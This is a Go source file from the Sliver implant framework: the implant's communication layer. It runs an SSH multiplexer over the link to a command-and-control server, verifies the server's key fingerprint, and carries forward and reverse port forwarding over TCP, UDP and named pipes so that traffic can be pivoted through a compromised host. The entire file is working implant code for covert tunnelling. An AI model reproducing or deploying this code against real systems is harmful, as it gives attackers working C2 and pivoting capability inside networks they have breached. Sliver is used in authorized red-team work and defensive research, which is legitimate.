package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"crypto/sha256"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh"

	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/commpb"
	"github.com/bishopfox/sliver/sliver/constants"
)

var (
	// Used to authenticate the server when using SSH.
	serverKeyFingerprint = `{{.Config.ServerFingerprint}}`
)

// Comm - Wrapper around a net.Conn, adding SSH infrastructure for encryption and tunneling to an implant.
// Through this Comm object the server and its clients can route various types of traffic in both directions.
// This includes API-used dialers/listeners, client port forwarders, and proxied traffic.
type Comm struct {
	// Core
	SessionID     uint32            // Any multiplexer's physical connection is tied to an implant.
	RemoteAddress string            // The multiplexer may be tied to a pivoted implant.
	ssh           ssh.Conn          // SSH Connection, that we will mux
	config        *ssh.ClientConfig // We are the talking to the C2 server.
	fingerprint   string            // A key fingerprint to authenticate the server/pivot.
	conn          net.Conn          // The underlying pseudo net.Conn, on top of the RPC.

	// Connection management
	requests <-chan *ssh.Request   // Keep alive
	inbound  <-chan ssh.NewChannel // Inbound mux requests
	mutex    *sync.RWMutex         // Concurrency management.
	pending  int                   // Number of actively processed connections.
}

// InitClient - Sets up and start a SSH connection (multiplexer)
// around a logical connection/stream, or a Session RPC.
func InitClient(conn net.Conn, key []byte) (err error) {
	// Return if we don't have what we need.
	if conn == nil {
		return errors.New("net.Conn is nil, cannot init Comm")
	}

	// New SSH multiplexer Comm
	comm := &Comm{
		conn:  conn,
		mutex: &sync.RWMutex{},
	}

	// Pepare the SSH conn/security, and set keepalive policies/handlers.
	err = comm.setupAuthClient(key, constants.SliverName)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to setup SSH client connection: %s", err.Error())
		// {{end}}
		return err
	}

	// {{if .Config.Debug}}
	log.Printf("Initiating SSH client connection...")
	// {{end}}

	// We are the client of the C2 server here.
	comm.ssh, comm.inbound, comm.requests, err = ssh.NewClientConn(conn, "", comm.config)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to initiate SSH connection: %s", err.Error())
		// {{end}}
		return
	}

	go comm.serveRequests() // Serve pings & requests with keepalive policies.

	Comms.Add(comm)   // Everything is up and running, register the mux.
	go comm.serveC2() // Handle requests (pings) and incoming connections in the background.

	return
}

// setupAuthClient - The Comm prepares SSH code and security details for a client connection.
func (comm *Comm) setupAuthClient(key []byte, name string) (err error) {

	// Private key is used to authenticate to the server/pivot.
	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("SSH failed to parse Private Key: %s", err.Error())
		// {{end}}
		return
	}

	comm.config = &ssh.ClientConfig{
		User:            name,                                     // The user is the implant name.
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)}, // Authenticate as the implant.
		HostKeyCallback: comm.verifyServer,                        // Checks the key given by the server/pivot.
	}

	return
}

// verifyServer - Check the server's host key fingerprint. We have an exampled compiled in above.
func (comm *Comm) verifyServer(hostname string, remote net.Addr, key ssh.PublicKey) error {
	expect := serverKeyFingerprint
	if expect == "" {
		return errors.New("No server key fingerprint")
	}

	// calculate the SHA256 hash of an SSH public key
	bytes := sha256.Sum256(key.Marshal())
	got := base64.StdEncoding.EncodeToString(bytes[:])

	_, err := base64.StdEncoding.DecodeString(expect)
	if _, ok := err.(base64.CorruptInputError); ok {
		return fmt.Errorf("MD5 fingerprint (%s), update to SHA256 fingerprint: %s", expect, got)
	} else if err != nil {
		return fmt.Errorf("Error decoding fingerprint: %w", err)
	}
	if got != expect {
		return fmt.Errorf("Invalid fingerprint (%s)", got)
	}

	// {{if .Config.Debug}}
	log.Printf("Fingerprint %s", got)
	// {{end}}
	return nil
}

// serveC2 - Serves all inbound (server -> implant) connections.
func (comm *Comm) serveC2() {
	// At the end of this function the Comm will be closed, so we clean it up.
	defer func() {
		// {{if .Config.Debug}}
		log.Printf("Closing SSH client connection ...")
		// {{end}}
		err := comm.ssh.Close()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error closing SSH connection: %s", err.Error())
			// {{end}}
		}
		// Remove this multiplexer from our active sockets.
		Comms.Remove(comm.RemoteAddress)
	}()

	// For each incoming stream request, process concurrently. Blocking
	for in := range comm.inbound {
		go comm.handleForward(in)
	}
}

// handleConnInbound - Handle, validate and pipe a single logical connection (blocking)
func (comm *Comm) handleForward(ch ssh.NewChannel) {

	// Parse incoming connection request details
	info := &commpb.Conn{}
	err := proto.Unmarshal(ch.ExtraData(), info)
	if info.ID == "" || err != nil {
		// {{if .Config.Debug}}
		log.Printf("rejected connection: (bad info payload: %s)", info.ID)
		// {{end}}
		return
	}

	// Add conn stats.
	comm.pending++
	defer func() {
		comm.pending--
	}()

	// The application-layer protocol prevails over the transport protocol
	switch info.Application {
	case commpb.Application_NamedPipe:
		// {{if .Config.NamePipec2Enabled}}
		err := comm.DialNamedPipe(info, ch)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error dialing named pipe: %s:%d -> %s:%d",
				info.LHost, info.LPort, info.RHost, info.RPort)
			// {{end}}
			ch.Reject(ssh.ConnectionFailed, err.Error())
		}
		return
		// {{end}} -NamePipec2Enabled
	default:
		goto TRANSPORT
	}

TRANSPORT:
	switch info.Transport {
	case commpb.Transport_TCP:
		err := dialTCP(info, ch)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error dialing TCP: %s:%d -> %s:%d",
				info.LHost, info.LPort, info.RHost, info.RPort)
			// {{end}}
			ch.Reject(ssh.ConnectionFailed, err.Error())
		}
		return

	case commpb.Transport_UDP:
		err := DialUDP(info, ch)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error dialing UDP: %s:%d -> %s:%d",
				info.LHost, info.LPort, info.RHost, info.RPort)
			// {{end}}
			ch.Reject(ssh.ConnectionFailed, err.Error())
		}
		return
	}

	// We should never get here, so we reject the incoming connection
	ch.Reject(ssh.ConnectionFailed, "No valid ID or transport protocol")
}

// handleReverse - A net.Conn and the info of its handler (a listener/dialer)
// is passed to the implant comm and routed back to the server.
func (comm *Comm) handleReverse(h *commpb.Handler, conn net.Conn) {

	// Additional information for this connection
	rHost := strings.Split(conn.RemoteAddr().String(), ":")[0]
	rPortStr := strings.Split(conn.RemoteAddr().String(), ":")[1]
	rPort, _ := strconv.Atoi(rPortStr)

	// Populate the connection info with all details from the handler struct:
	// we assume all fields are good, otherwise the server/implant would have
	// returned an error before spawing the listener/dialer.
	info := &commpb.Conn{
		// Handler-drawn information
		ID:          h.ID,
		Transport:   h.Transport,
		Application: h.Application,
		LHost:       h.RHost, // We are listening on this address
		LPort:       h.RPort, // We are listening on this port
		// Connection-drawn information
		RHost: rHost,
		RPort: int32(rPort),
	}
	data, _ := proto.Marshal(info)

	// Create muxed channel and pipe, or close the connection if failure.
	dst, reqs, err := comm.ssh.OpenChannel(commpb.Request_PortfwdStream.String(), data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to open channel: %s", err.Error())
		// {{end}}
		err = conn.Close()
		return
	}
	go ssh.DiscardRequests(reqs)

	// Pipe the connection. (blocking)
	transportConn(conn, dst)

	// Close connections once we're done, with a delay left so our
	// custom RPC tunnel has time to transmit the remaining data.
	closeConnections(conn, dst)
}

// getStream - A handler may request ahead a stream over which to transmit its data.
// The ID given is mandatorily linked to a working abstracted listener/forwarder on the server.
func (comm *Comm) getStream(h *commpb.Handler) io.ReadWriteCloser {

	// Populate the connection info
	info := &commpb.Conn{
		ID:          h.ID,
		Transport:   h.Transport,
		Application: h.Application,
		LHost:       h.LHost,
		LPort:       h.LPort,
		RHost:       h.RHost,
		RPort:       h.RPort,
	}
	data, _ := proto.Marshal(info)

	// Create muxed channel and return it
	dst, reqs, err := comm.ssh.OpenChannel(commpb.Request_PortfwdStream.String(), data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to open channel: %s", err.Error())
		// {{end}}
		return nil
	}
	go ssh.DiscardRequests(reqs)

	return dst
}

// serverRequests - Handles all requests coming from the
// implant comm. (latency checks, close requests, etc.)
func (comm *Comm) serveRequests() {

	for req := range comm.requests {

		// If portfwd_open, start the appropriate listener
		// These are always REVERSE port forwarding requests.
		if req.Type == commpb.Request_HandlerOpen.String() {

			// Request / Response
			openReq := &commpb.HandlerStartReq{}
			proto.Unmarshal(req.Payload, openReq)
			open := &commpb.HandlerStart{Response: &commonpb.Response{}}

			var err error

			// Swith on transport protocol.
			switch openReq.Handler.Transport {
			case commpb.Transport_TCP:
				_, err = ListenTCP(openReq.Handler)

			case commpb.Transport_UDP:
				err = ListenUDP(openReq.Handler)
			}

			// Send back reply to the server Comm
			if err != nil {
				open.Response.Err = err.Error()
			} else {
				open.Success = true
			}
			data, _ := proto.Marshal(open)
			req.Reply(true, data)
		}

		// If portfwd_close, close the appropriate listener.
		// These are always REVERSE port forwarding requests.
		if req.Type == commpb.Request_HandlerStop.String() {

			// Request / Response
			closeReq := &commpb.HandlerCloseReq{}
			proto.Unmarshal(req.Payload, closeReq)
			closeRes := &commpb.HandlerClose{Response: &commonpb.Response{}}

			// Call job stop (Protocol-agnostic)
			err := Listeners.Remove(closeReq.Handler.ID)

			// Send back reply to the server Comm
			if err != nil {
				closeRes.Response.Err = err.Error()
			} else {
				closeRes.Success = true
			}
			data, _ := proto.Marshal(closeRes)
			req.Reply(true, data)
		}

		// If ping, respond keepalive
		if req.Type == "keepalive" {
			err := req.Reply(true, []byte{})
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Error replying to request")
				// {{end}}
			}
		}

		// If latency, respond time.Now as string, for double check
		if req.Type == "latency" {
			t := fmt.Sprintf("%d", time.Now().UnixNano())
			err := req.Reply(true, []byte(t))
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Error replying to request")
				// {{end}}
			}
		}
	}
}

// PrepareCommSwitch - Kills all components of the Comm tied
// to the current active C2, before a transport switch.
func PrepareCommSwitch() (err error) {

	// Kill listeners, or notify wait.
	for _, ln := range Listeners.active {
		err = ln.close()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Listener close error before transport switch: %s", err.Error())
			// {{end}}
		}
	}

	// Close the SSH layer
	err = Comms.server.ssh.Close()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Comm SSH close error before transport switch: %s", err.Error())
		// {{end}}
	}

	// Close the custom RPC tunnel
	err = Comms.server.conn.Close()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Comm underlying conn (Tunnel?) close error: %s", err.Error())
		// {{end}}
	}

	return nil
}
